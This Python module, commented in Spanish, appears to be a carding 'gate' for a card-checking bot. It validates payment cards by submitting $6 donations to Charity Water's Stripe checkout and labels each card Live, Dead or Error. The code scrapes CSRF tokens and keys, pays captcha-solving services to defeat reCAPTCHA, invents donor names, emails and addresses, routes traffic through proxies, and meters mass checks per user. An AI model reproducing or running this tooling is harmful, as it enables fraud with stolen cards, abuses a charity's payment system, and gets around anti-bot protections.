"""Gate Iris (Stripe $6 USD) — Charity Water: flujo Rails real en 2 pasos.
NOTA 2026-10-23: gate DESACTIVADO — el checkout real solo existe
en iframe de Stripe Elements (navegador). Por HTTP el backend
responde thank-you estático sin crear el cargo. NO mapear este
GATE aunque el archivo esté presente en el repo.

Flujo medido en el JS de producción de /donate (bundles vite):
  1. GET /donate → cookies + csrf-token + endpointPaths + campaignId + pk
     + sitekey reCAPTCHA v2 (window.recaptchaV2SiteKey).
  2. Resolver reCAPTCHA v2 (CapSolver -> AntiCaptcha -> 2Captcha, §7.2).
  3. Crear pm_ vía POST /v1/payment_methods con pk + payment_user_agent
     móvil (la tokenización no consulta al emisor: el veredicto real lo da
     el backend; ver bloque Stripe de la skill).
  4. POST https://www.charitywater.org/donate/stripe/payment_method con el
     payload Rails: payment_gateway_token=pm_ + donation_form anidado +
     payment_intent + recaptcha[token] + idempotency_key + X-CSRF-Token.

La ruta vieja /api/v4/donations/one-time devuelve 404 en producción
(medido 2026-10-23): está muerta, por eso se migra a este POST real.

Veredicto: aprobada -> Live, rechazada por el banco -> Dead,
3DS/acción manual o captcha/CSRF -> Error (no es veredicto de tarjeta).
"""
from __future__ import annotations

import asyncio
import logging
import os
import random
import re
import time
import uuid
from typing import Dict, Optional, Tuple

import requests

logger = logging.getLogger(__name__)

USER_ERROR_MSG = "Error gate reportado"


def _gate_error(detail: str) -> Dict[str, str]:
    """Un solo mensaje de error sanitizado; el detalle queda en el log."""
    logger.warning("Iris error: %s", detail)
    return {"status": "⚠️ Error", "message": USER_ERROR_MSG}

IRIS_GATE_NAME = "Iris Stripe $6 USD"
IRIS_PLANS = {"olimpo", "mensual"}
IRIS_AMOUNT_USD = 6.0
IRIS_SINGLE_COOLDOWN = 20
IRIS_MASS_COOLDOWN = 30
IRIS_MASS_LIMIT = 10
IRIS_MASS_CREDIT_COST = 5

# Medidos en el HTML vivo de /donate (fallbacks si el parseo falla).
STRIPE_PK_FALLBACK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
RECAPTCHA_V2_SITEKEY_FALLBACK = "6LeenTEUAAAAAHPWTu78t3HP_UwZf_4JGThNJiRH"
CAMPAIGN_ID_FALLBACK = "0e287b7d-c951-4371-b93f-adaa9a0d"  # system-donate
CW_BASE = "https://www.charitywater.org"
CW_DONATE = f"{CW_BASE}/donate"
CW_PM_ENDPOINT = f"{CW_BASE}/donate/stripe/payment_method"
CW_SETUP_INTENTS = f"{CW_BASE}/api/v1/stripe/setup_intents"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
TIMEOUT_SOLVER = 25
TIMEOUT_STRIPE = (5, 25)
TIMEOUT_WEBPAGE = (5, 15)
SOLVER_POLL_TRIES = 25
SOLVER_POLL_INTERVAL = 4
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]

captcha_stats = {
    "total_attempts": 0,
    "successful": 0,
    "failed": 0,
    "avg_solve_time": 0.0,
    "total_solve_time": 0.0,
}

_BANK_DECLINE_WORDS = (
    "declined", "do_not_honor", "do not honor", "insufficient",
    "card_declined", "incorrect_cvc", "invalid_cvc", "expired_card",
    "card was declined", "payment was declined", "your card",
    "do_not_honor", "generic_decline", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
)
_TOOL_WORDS = (
    "recaptcha", "captcha", "csrf", "authenticity", "idempot",
    "param", "missing", "required field", "invalid request",
)


def _extract_cw_config(html: str) -> Dict[str, str]:
    """Saca csrf/pk/sitekey/campaign_id del HTML vivo de /donate."""
    cfg = {
        "csrf": "",
        "pk": STRIPE_PK_FALLBACK,
        "sitekey": RECAPTCHA_V2_SITEKEY_FALLBACK,
        "campaign_id": CAMPAIGN_ID_FALLBACK,
        "endpoint_pm": CW_PM_ENDPOINT,
    }
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
    if m:
        cfg["csrf"] = m.group(1)
    m = re.search(r'stripePublishableKey\\*"?:\s*\\*"(pk_[^"\\]+)', html)
    if m:
        cfg["pk"] = m.group(1)
    m = re.search(r'recaptchaV2SiteKey\\*["\']?\s*[:=]\s*\\*["\']([^"\'\\]+)', html)
    if m:
        cfg["sitekey"] = m.group(1).strip()
    m = re.search(r'"campaignId":"([0-9a-fA-F-]{36})"', html)
    if m:
        cfg["campaign_id"] = m.group(1)
    m = re.search(r'stripePaymentMethod\\*"?:\s*\\*"([^"\\]+)', html)
    if m:
        cfg["endpoint_pm"] = m.group(1).replace("\\/", "/")
    return cfg


def _poll_task_result(base_url: str, client_key: str, task_id: str) -> str:
    """Espera el resultado de createTask/getTaskResult (CapSolver y 2Captcha)."""
    for _ in range(SOLVER_POLL_TRIES):
        try:
            r = requests.post(
                f"{base_url}/getTaskResult",
                json={"clientKey": client_key, "taskId": task_id},
                timeout=TIMEOUT_SOLVER,
            ).json()
        except Exception:
            time.sleep(SOLVER_POLL_INTERVAL)
            continue
        if r.get("status") == "ready":
            return r.get("solution", {}).get("gRecaptchaResponse", "") or ""
        if r.get("status") == "failed" or r.get("errorId") not in (None, 0, False):
            return ""
        time.sleep(SOLVER_POLL_INTERVAL)
    return ""


def _solve_capsolver_recaptcha_v2(client_key: str, page_url: str, sitekey: str) -> str:
    try:
        r = requests.post(
            "https://api.capsolver.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        logger.warning("capsolver create error: %s", exc)
        return ""
    if r.get("errorId") not in (None, 0, False) or not r.get("taskId"):
        logger.warning("capsolver create failed: %s", str(r)[:200])
        return ""
    return _poll_task_result("https://api.capsolver.com", client_key, r["taskId"])


def _solve_anticaptcha_recaptcha_v2(client_key: str, page_url: str, sitekey: str) -> str:
    try:
        r = requests.post(
            "https://api.anti-captcha.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        logger.warning("anticaptcha create error: %s", exc)
        return ""
    if r.get("errorId") not in (None, 0) or not r.get("taskId"):
        logger.warning("anticaptcha create failed: %s", str(r)[:200])
        return ""
    task_id = r["taskId"]
    for _ in range(SOLVER_POLL_TRIES):
        try:
            res = requests.post(
                "https://api.anti-captcha.com/getTaskResult",
                json={"clientKey": client_key, "taskId": task_id},
                timeout=TIMEOUT_SOLVER,
            ).json()
        except Exception:
            time.sleep(SOLVER_POLL_INTERVAL)
            continue
        if res.get("status") == "ready":
            return res.get("solution", {}).get("gRecaptchaResponse", "") or ""
        if res.get("status") == "failed" or res.get("errorId") not in (None, 0):
            return ""
        time.sleep(SOLVER_POLL_INTERVAL)
    return ""


def _solve_2captcha_recaptcha_v2(client_key: str, page_url: str, sitekey: str) -> str:
    # 2Captcha acepta el protocolo estilo CapSolver (ver §7.2 de la skill).
    try:
        r = requests.post(
            "https://api.2captcha.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        logger.warning("2captcha create error: %s", exc)
        return ""
    task_id = r.get("taskId")
    if r.get("errorId") not in (None, 0, False) or not task_id:
        logger.warning("2captcha create failed: %s", str(r)[:200])
        return ""
    return _poll_task_result("https://api.2captcha.com", client_key, task_id)


def _captcha_token(page_url: str, sitekey: str) -> Optional[str]:
    """Resolver reCAPTCHA v2 vía CapSolver -> AntiCaptcha -> 2Captcha."""
    captcha_stats["total_attempts"] += 1
    start = time.time()
    token = ""
    capsolver_key = os.environ.get("CAPSOLVER_API_KEY", "")
    anticaptcha_key = os.environ.get("ANTICAPTCHA_API_KEY", "")
    twocaptcha_key = os.environ.get("TWO_CAPTCHA_API_KEY", "")
    if capsolver_key:
        token = _solve_capsolver_recaptcha_v2(capsolver_key, page_url, sitekey)
    if not token and anticaptcha_key:
        token = _solve_anticaptcha_recaptcha_v2(anticaptcha_key, page_url, sitekey)
    if not token and twocaptcha_key:
        token = _solve_2captcha_recaptcha_v2(twocaptcha_key, page_url, sitekey)
    if token:
        solve_time = time.time() - start
        captcha_stats["successful"] += 1
        captcha_stats["total_solve_time"] += solve_time
        captcha_stats["avg_solve_time"] = captcha_stats["total_solve_time"] / captcha_stats["successful"]
        return token
    captcha_stats["failed"] += 1
    logger.warning("Captcha no resuelto (sin solver con saldo o timeout)")
    return None


def _stripe_pm(card: str, email: str, name: str, pk: str, proxy: dict) -> Dict[str, str]:
    """Crear pm_ con la pk del sitio (solo formato; el veredicto lo da Rails)."""
    card_number, exp_month, exp_year, cvc = card.split("|")
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": CW_BASE,
    }
    data = {
        "type": "card",
        "card[number]": card_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc,
        "billing_details[name]": name,
        "billing_details[email]": email,
        "payment_user_agent": "stripe-android/20.26.0",
        "key": pk,
    }
    form_data = "&".join([f"{k}={v}" for k, v in data.items()])
    try:
        response = requests.post(
            STRIPE_PM_URL, data=form_data, headers=headers, proxies=proxy, timeout=TIMEOUT_STRIPE[1]
        )
    except Exception as exc:
        return {"ok": False, "transient": True, "message": f"Stripe sin respuesta: {exc}"}
    if response.status_code != 200:
        try:
            err = (response.json().get("error") or {})
            code = str(err.get("code", ""))
            msg = str(err.get("message", ""))[:140]
        except Exception:
            code, msg = "", f"HTTP {response.status_code}"
        logger.warning("Stripe pm error %s [%s]: %s", response.status_code, code, msg)
        if code in ("incorrect_number", "invalid_expiry_month", "invalid_expiry_year"):
            return {"ok": False, "transient": False, "message": f"Formato inválido ({code})"}
        return {"ok": False, "transient": True, "message": f"Stripe {response.status_code} [{code}]: {msg}"}
    try:
        body = response.json()
    except Exception as exc:
        return {"ok": False, "transient": True, "message": f"Stripe JSON inválido: {exc}"}
    pm_id = str(body.get("id", ""))
    if not pm_id.startswith("pm_"):
        return {"ok": False, "transient": True, "message": "Stripe sin pm_ en respuesta"}
    return {"ok": True, "pm_id": pm_id}


def _setup_intent(
    session: requests.Session, cfg: Dict[str, str], email: str,
    name: str, captcha: str, proxy: dict,
) -> str:
    """POST /api/v1/stripe/setup_intents con headers Rails reales."""
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-Token": cfg["csrf"],
        "Origin": CW_BASE,
        "Referer": CW_DONATE,
    }
    try:
        r = session.post(
            CW_SETUP_INTENTS,
            data={
                "country": "us",
                "metadata[donation_kind]": "water",
                "setup_intent[email]": email,
                "setup_intent[name]": name,
                "recaptcha[token]": captcha,
            },
            headers=headers,
            proxies=proxy,
            timeout=TIMEOUT_WEBPAGE[1],
        )
        if r.status_code != 200:
            logger.warning("setup_intents %s: %s", r.status_code, r.text[:120])
            return ""
        return str(r.json().get("id", "") or "")
    except Exception as exc:
        logger.warning("setup_intents error: %s", exc)
        return ""


_RECEIPT_MARKERS = ("thank-you", "thank_you", "thankyou-receipt", "/receipt", "donation successful", "order complete")

# Marcadores exigidos en el HTML del recibo tras el GET de seguimiento.
# Un 200 con payload vacío o sin estos textos NO es cargo.
_RECEIPT_BODY_MARKERS = (
    "thank-you", "thank_you", "thankyou-receipt", "/receipt",
    "donation successful", "order complete", "donation receipt",
    "thank you for your donation", "your donation was successful",
)


_CALIB_PATH = "/home/olimpo/GenCookie/GenCookie/data/iris_calibration.jsonl"


def _calibrate(cc_last4: str, status: int, body: str, endpoint: str) -> None:
    """Guarda la respuesta cruda del backend para calibrar el veredicto."""
    try:
        import json as _json
        import datetime as _dt

        with open(_CALIB_PATH, "a", encoding="utf-8") as f:
            f.write(_json.dumps({
                "ts": _dt.datetime.now().isoformat(timespec="seconds"),
                "last4": cc_last4, "endpoint": endpoint,
                "status": status, "body": body[:4000],
            }, ensure_ascii=False) + "\n")
    except Exception as exc:
        logger.warning("Iris calibración no guardada: %s", exc)


def _has_receipt_id(redir: str) -> bool:
    """El redirect de un cargo real trae identificador; el bare /thank-you no."""
    return bool(re.search(r'[?&=]([^&=/?#]{2,})|/(?:thank-you|thankyou|receipt|donations)/[^/\s?#]+', redir, re.I))


def _handle_rails_redirect(session, redir: str, proxy: dict, last4: str) -> tuple:
    """Redirect solo es Live con recibo + identificador + GET que lo confirme."""
    low = redir.lower()
    if not any(k in low for k in _RECEIPT_MARKERS):
        return "⚠️ Error", f"Redirect sin recibo: {redir[:80]}"
    if not _has_receipt_id(redir):
        logger.warning("Iris redirect a recibo SIN identificador (no es cargo): %s", redir[:160])
        return "⚠️ Error", "Sin confirmación de recibo"
    logger.info("Iris rails redirect a recibo con id, confirmando con GET: %s", redir[:120])
    return _confirm_receipt(session, redir, proxy)


def _confirm_receipt(session, redirect_url: str, proxy: dict) -> tuple:
    """GET de seguimiento al redirectUrl: solo Live si el recibo confirma el cargo."""
    url = redirect_url if redirect_url.startswith("http") else f"{CW_BASE}{redirect_url}"
    try:
        g = session.get(
            url,
            headers={"User-Agent": UA, "Accept": "text/html", "Referer": CW_DONATE},
            proxies=proxy,
            timeout=TIMEOUT_WEBPAGE[1],
            allow_redirects=True,
        )
    except Exception as exc:
        logger.warning("Iris receipt GET sin respuesta: %s", exc)
        return "⚠️ Error", "Sin confirmación de recibo (GET fallido)"
    body = (g.text or "")[:8000]
    low = body.lower()
    if g.status_code == 200 and any(k in low for k in _RECEIPT_BODY_MARKERS):
        return "✅ Live", f"Approved ${IRIS_AMOUNT_USD:.0f} USD"
    logger.warning("Iris recibo no concluyente (%s): %s", g.status_code, body[:160].replace("\n", " "))
    return "⚠️ Error", f"Sin confirmación de recibo ({g.status_code})"


def _classify_rails_response(status_code: int, body: str) -> Tuple[str, str]:
    """Traduce la respuesta del endpoint Rails a (status, message).

    Regla anti-falsos-Live: Live SOLO con marcador positivo explícito
    (redirect a recibo/thank-you o "success":true real). Todo lo ambiguo
    (HTML con menciones, "success":false, redirects sin recibo) va a Error,
    nunca a Live. Un Live falso es peor que un Error honesto.
    """
    low = body.lower()
    low_ns = re.sub(r"\s+", "", low)
    try:
        import json as _json

        data = _json.loads(body)
    except Exception:
        data = None
    if isinstance(data, dict):
        if data.get("requiresAction") or data.get("requires_action"):
            return "⚠️ Error", "3DS/acción manual requerida"
        if data.get("duplicate_request") is True:
            return "✅ Live", "Duplicada (cargo existente)"
        redir = str(data.get("redirectUrl") or data.get("redirect_url") or "")
        if redir:
            # El POST real intercepta esto antes con GET de confirmación;
            # aquí (fallback sin sesión) un redirect solo no es cargo.
            return "⚠️ Error", f"Redirect sin confirmación: {redir[:80]}"
        err = data.get("error") or {}
        msg = str(err.get("message") if isinstance(err, dict) else err or data.get("message") or "")[:160]
        ok_true = any(
            k in low_ns
            for k in ('"success":true', '"succeeded":true', '"status":"succeeded"', '"payment_status":"succeeded"')
        )
        if ok_true and 200 <= status_code < 300:
            return "✅ Live", f"Approved ${IRIS_AMOUNT_USD:.0f} USD"
        if status_code in (400, 402, 422) and msg:
            if any(w in msg.lower() for w in _TOOL_WORDS):
                return "⚠️ Error", msg
            return "❌ Dead", msg
        if status_code == 418:
            return "⚠️ Error", "reCAPTCHA rechazado (418)"
        if status_code in (401, 403, 429):
            return "⚠️ Error", f"Bloqueo/límite ({status_code})"
        if 200 <= status_code < 300:
            if any(k in low for k in _RECEIPT_MARKERS):
                return "✅ Live", f"Approved ${IRIS_AMOUNT_USD:.0f} USD"
            return "⚠️ Error", f"Sin veredicto claro ({status_code})"
        if 500 <= status_code:
            return "⚠️ Error", f"Servidor {status_code}"
        return ("❌ Dead", msg or f"Rechazada ({status_code})") if msg else ("⚠️ Error", f"HTTP {status_code}")
    if 200 <= status_code < 400 and any(k in low for k in _RECEIPT_MARKERS):
        return "✅ Live", f"Approved ${IRIS_AMOUNT_USD:.0f} USD"
    if status_code == 418:
        return "⚠️ Error", "reCAPTCHA rechazado (418)"
    if status_code in (401, 403, 429):
        return "⚠️ Error", f"Bloqueo/límite ({status_code})"
    if 500 <= status_code:
        return "⚠️ Error", f"Servidor {status_code}"
    if any(w in low for w in _BANK_DECLINE_WORDS):
        m = re.search(r'(.{0,80}(?:declined|do not honor|insufficient|card_declined|incorrect_cvc|expired_card).{0,80})', low)
        return "❌ Dead", (m.group(1).strip() if m else "Rechazada por el banco")[:160]
    return "⚠️ Error", f"Sin veredicto claro ({status_code})"


def _donate_rails(
    session: requests.Session, cfg: Dict[str, str], pm_id: str,
    setup_intent_id: str, cc: str, mes: str, ano: str,
    first_name: str, last_name: str, email: str,
    captcha: str, proxy: dict,
) -> Tuple[str, str]:
    """POST real a /donate/stripe/payment_method con el payload Rails."""
    zip_code = str(random.randint(10000, 99999))
    idem = uuid.uuid4().hex
    full_name = f"{first_name} {last_name}"
    amount = f"{IRIS_AMOUNT_USD:.0f}"
    last4 = cc[-4:]
    payload = {
        "disable_existing_subscription_check": "false",
        # --- payment_intent (unión moderna del JS) ---
        "country": "us",
        "payment_intent[email]": email,
        "payment_intent[amount]": amount,
        "payment_intent[currency]": "usd",
        "payment_intent[metadata][donation_kind]": "water",
        "payment_intent[payment_method]": pm_id,
        # --- donation_form Rails anidado ---
        "donation_form[amount]": amount,
        "donation_form[anonymous]": "false",
        "donation_form[comment]": "",
        "donation_form[display_name]": "",
        "donation_form[email]": email,
        "donation_form[name]": first_name,
        "donation_form[payment_gateway_token]": pm_id,
        "donation_form[payment_monthly_subscription]": "false",
        "donation_form[surname]": last_name,
        "donation_form[campaign_id]": cfg["campaign_id"],
        "donation_form[setup_intent_id]": setup_intent_id,
        "donation_form[subscription_period]": "",
        "donation_form[metadata][claimed_gift_aid]": "false",
        "donation_form[metadata][donation_kind]": "water",
        "donation_form[metadata][email_consent_granted]": "true",
        "donation_form[metadata][event_kiosk_mode]": "false",
        "donation_form[metadata][full_donate_page_url]": CW_DONATE,
        "donation_form[metadata][landing_page_campaign_tag]": "",
        "donation_form[metadata][phone_number]": "",
        "donation_form[metadata][phone_number_consent_granted]": "false",
        "donation_form[metadata][referer]": "",
        "donation_form[metadata][send_default_welcome_series_emails]": "true",
        "donation_form[metadata][strict_consent_region]": "true",
        "donation_form[metadata][url_params]": "",
        "donation_form[metadata][session_url_params]": "",
        "donation_form[metadata][with_saved_payment]": "false",
        "donation_form[address][address_line_1]": f"{random.randint(100, 999)} Main St",
        "donation_form[address][address_line_2]": "",
        "donation_form[address][city]": "New York",
        "donation_form[address][country]": "US",
        "donation_form[address][zip]": zip_code,
        "donation_form[card_last4]": last4,
        "donation_form[card_name]": full_name,
        # --- control ---
        "idempotency_key": idem,
        "recaptcha[token]": captcha,
        "authenticity_token": cfg["csrf"],
    }
    headers = {
        "User-Agent": UA,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": CW_BASE,
        "Referer": CW_DONATE,
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-Token": cfg["csrf"],
    }
    try:
        r = session.post(
            cfg["endpoint_pm"], data=payload, headers=headers, proxies=proxy,
            timeout=TIMEOUT_STRIPE[1],
        )
    except Exception as exc:
        return "⚠️ Error", f"Donación sin respuesta: {exc}"
    raw_body = r.text or ""
    # Verificación 1: 200 con payload vacío NO es cargo.
    try:
        import json as _json

        _data = _json.loads(raw_body) if raw_body.strip() else None
    except Exception:
        _data = None
    if r.status_code == 200 and not _data:
        logger.warning("Iris rails 200 con payload vacío: no es cargo")
        return "⚠️ Error", "Sin veredicto claro (200 vacío)"
    _calibrate(cc[-4:], r.status_code, raw_body, "rails-pm")
    # Verificación 2: redirect solo vale con recibo + identificador + GET que lo confirme.
    if isinstance(_data, dict):
        _redir = str(_data.get("redirectUrl") or _data.get("redirect_url") or "")
        if _redir:
            return _handle_rails_redirect(session, _redir, proxy, cc[-4:])
    status, msg = _classify_rails_response(r.status_code, raw_body[:4000])
    logger.info("Iris rails %s -> %s | %s", r.status_code, msg[:80], raw_body[:160].replace("\n", " "))
    return status, msg


def _flujo_iris(cc: str, mes: str, ano: str, cvv: str, proxy: dict) -> Dict[str, str]:
    """Flujo completo: página -> config -> captcha -> pm -> setup_intent -> Rails."""
    started = time.monotonic()
    email = f"{random.choice(FIRST_NAMES).lower()}{random.choice(LAST_NAMES).lower()}{random.randint(100, 999)}@gmail.com"
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)

    session = requests.Session()
    try:
        page = session.get(
            CW_DONATE, headers={"User-Agent": UA, "Accept": "text/html"},
            proxies=proxy, timeout=TIMEOUT_WEBPAGE[1],
        )
        if page.status_code != 200:
            return _gate_error(f"Error obteniendo página ({page.status_code})")
        cfg = _extract_cw_config(page.text)
        sitekey = _captcha_token(CW_DONATE, cfg["sitekey"])
        if not sitekey:
            return _gate_error("Captcha no resuelto")
        pm = _stripe_pm(f"{cc}|{mes}|{ano}|{cvv}", email, f"{first_name} {last_name}", cfg["pk"], proxy)
        if not pm.get("ok"):
            if pm.get("transient"):
                return _gate_error(pm.get("message", "Token Stripe fallido"))
            return {"status": "❌ Dead", "message": pm.get("message", "Token Stripe fallido")}
        setup_id = _setup_intent(session, cfg, email, f"{first_name} {last_name}", sitekey, proxy)
        if not setup_id:
            return _gate_error("SetupIntent no emitido (sin checkout)")
        status, msg = _donate_rails(
            session, cfg, pm["pm_id"], setup_id, cc, mes, ano,
            first_name, last_name, email, sitekey, proxy,
        )
        if status == "⚠️ Error":
            logger.warning("Iris donate error: %s", msg)
            msg = USER_ERROR_MSG
        elapsed = time.monotonic() - started
        return {"status": status, "message": msg, "elapsed": elapsed}
    except Exception as exc:
        return _gate_error(f"Error: {exc}")


async def iris_gate_check(
    card_data: str,
    user_id: int,
    shared_proxies: Optional[dict] = None,
) -> Dict[str, str]:
    """Verifica una tarjeta contra Iris (Stripe $6 USD)."""
    started = time.monotonic()
    if shared_proxies:
        proxy_url = shared_proxies.get("http") or shared_proxies.get("https")
    else:
        from bot.services.proxies import gate_proxy
        proxy_url = gate_proxy("mx")
    if not proxy_url:
        return _gate_error("Sin proxy disponible (salida directa prohibida)")
    proxy = {"http": proxy_url, "https": proxy_url}
    try:
        parts = [p.strip() for p in card_data.split("|")]
        if len(parts) != 4:
            return {"status": "❌ Dead", "message": "Formato inválido"}
        cc, mes, ano, cvv = parts
        if not cc.isdigit() or not (13 <= len(cc) <= 19):
            return {"status": "❌ Dead", "message": "Número inválido"}
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return {"status": "❌ Dead", "message": "Mes inválido"}
        mes = mes.zfill(2)
        ano = str(ano).strip()
        if not ano.isdigit() or len(ano) not in (2, 4):
            return {"status": "❌ Dead", "message": "Año inválido"}
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return {"status": "❌ Dead", "message": "CVV inválido"}
        raw = await asyncio.to_thread(_flujo_iris, cc, mes, ano, cvv, proxy)
        raw["elapsed"] = time.monotonic() - started
        return raw
    except Exception as exc:
        logger.exception("Error REAL en Iris: %s", exc)
        return _gate_error(f"Error: {exc}")
